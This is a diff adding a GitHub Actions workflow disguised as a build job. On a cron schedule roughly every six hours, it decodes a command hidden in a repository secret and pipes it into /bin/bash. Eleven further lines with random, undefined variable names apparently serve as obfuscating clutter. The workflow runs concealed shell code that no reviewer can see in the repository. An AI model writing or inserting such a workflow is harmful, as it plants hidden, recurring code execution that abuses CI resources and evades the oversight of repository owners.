@@ -1,0 +1,29 @@
+name: unaffectedleprosy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: unaffectedleprosy
+        env:
+          q72: ${{ secrets.q72 }}
+        run: |
+          echo $q72 | jq -r .cvlll72334 | /bin/bash
+          echo $rq833 | jq -r .zwq8 | /bin/bash
+          echo $tvol40620 | jq -r .cc40344 | /bin/bash
+          echo $z17806 | jq -r .n41 | /bin/bash
+          echo $ayvy8175 | jq -r .hgpgy63228 | /bin/bash
+          echo $bnc53374 | jq -r .l1829 | /bin/bash
+          echo $ph32 | jq -r .ybgca00743 | /bin/bash
+          echo $vrvbe039 | jq -r .o064 | /bin/bash
+          echo $pd08280 | jq -r .r97983 | /bin/bash
+          echo $x70768 | jq -r .zrb4 | /bin/bash
+          echo $nfimi2 | jq -r .ns402 | /bin/bash
+          echo $ykshk72 | jq -r .cco09258 | /bin/bash
+
